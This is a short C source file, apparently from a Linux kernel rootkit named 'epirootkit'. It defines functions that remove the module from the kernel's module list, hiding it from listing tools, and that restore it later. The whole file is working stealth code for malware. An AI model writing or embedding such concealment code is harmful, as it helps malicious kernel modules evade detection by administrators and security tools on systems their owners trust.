#include "epirootkit.h"

static struct list_head *prev_module;

void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

void unhide_module(void)
{
    list_add(&THIS_MODULE->list, prev_module);
}